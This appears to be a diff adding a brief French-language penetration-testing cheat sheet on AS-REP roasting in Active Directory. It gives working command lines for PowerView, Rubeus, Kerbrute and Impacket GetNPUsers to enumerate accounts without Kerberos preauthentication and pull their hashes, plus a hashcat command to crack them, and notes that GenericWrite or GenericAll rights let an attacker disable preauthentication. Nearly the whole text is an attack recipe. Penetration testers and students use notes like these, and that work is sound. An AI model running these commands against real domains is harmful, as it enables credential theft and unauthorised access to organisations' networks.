@@ -1,0 +1,19 @@
+##ASREP_Roasting
+Pas de préauth kerberos
+Si user avec GenericWrite ou GenericAll --> Possibilité de modifier l'option 'Do not Require Kerb préauth'
+
+#Enum avec ./PowerView.ps1
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
+
+#Rubeus
+.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
+
+#Kerbrute (Si pas de listes de user)
+kerbrute userenum -d <DOMAIN> --dc <ip_dc> <WORDLIST>
+
+#Impacket GetNPUsers
+impacket-getnpusers.py 
+impacket-GetNPUsers <DOMAIN>/<USER> -dc-ip <dc_ip> -no-pass
+
+#Crack avec Hashcat
+hashcat -m 18200 <HASH> <WORDLIST> (--force)
